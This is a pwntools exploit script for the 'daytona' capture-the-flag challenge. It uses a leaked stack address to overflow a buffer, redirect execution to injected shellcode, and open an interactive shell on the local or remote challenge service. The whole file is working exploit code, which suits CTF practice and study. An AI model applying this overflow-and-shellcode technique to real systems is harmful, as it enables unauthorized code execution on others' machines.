from pwn import *

chal = ELF('./daytona')

HOST = 'chal.sunshinectf.games'
PORT =  25606

gdbscript='''
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

if args.GDB:
    conn = gdb.debug([chal.path], gdbscript)
elif args.REMOTE:
    conn = remote(HOST, PORT)
else:
    conn = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', chal.path])

def main():
    addr_leak = int(conn.recvuntil(b'MPH')[26:-4], 10)
    addr_buf = addr_leak + 0x75
    info(f'{addr_leak = :#x}')
    info(f'{addr_buf = :#x}')
    
    shellcode = asm(shellcraft.sh())
    info(f'len(shellcode) = {len(shellcode):#x}')
    info(hexdump(shellcode))

    addr_shellcode = addr_leak + 0xc5
    payload = b"\0" * 0x48 + p64(addr_shellcode) + shellcode

    assert (b'\x0a' not in payload)
    conn.sendlineafter(b'??\n', payload)
    conn.interactive()

if __name__ == '__main__':
    main()